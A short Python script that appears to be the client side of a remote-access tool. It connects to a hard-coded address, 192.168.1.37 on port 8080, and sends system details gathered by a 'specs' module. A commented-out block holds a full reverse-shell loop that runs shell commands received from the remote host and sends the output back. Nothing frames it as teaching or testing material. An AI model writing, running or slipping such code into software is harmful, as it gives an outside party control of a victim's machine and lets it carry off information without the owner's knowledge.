import socket
import os
import subprocess
import sys
import specs

host = '192.168.1.37'
port = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def establishConnection():
    try:
        s.connect((host, port))
    except socket.error as errorMsg:
        print(errorMsg)

def executeCommand():
    sentMsg = specs.StaticSpecs()
    s.send(str.encode(sentMsg))
    # while True:
    #     data = s.recv(1024)
    #     if data[:2].decode('utf-8') == 'cd':
    #         os.chdir(data[3:].decode('utf-8'))
    #     elif data.decode('utf-8') == 'here?':
    #         s.send(str.encode('yes'))
    #     elif data.decode('utf-8') == 'quit':
    #         s.send(str.encode('quit'))
    #         break
    #     elif data.decode('utf-8') == ':wq':
    #         s.close()
    #         sys.exit(0)
    #         break
    #     elif len(data) > 0:
    #         cmd = subprocess.Popen(data[:].decode('utf-8'), shell = True, stdout = subprocess.PIPE,
    #         stderr = subprocess.PIPE, stdin = subprocess.PIPE)
    #         outputBytes = cmd.stdout.read() + cmd.stderr.read()
    #         output = str(outputBytes, 'utf-8')
    #         s.send(str.encode(output + str(os.getcwd()) + '> '))
    #         print(output)
    s.close()

def main():
    establishConnection()
    executeCommand()

if __name__ == '__main__':
    main()
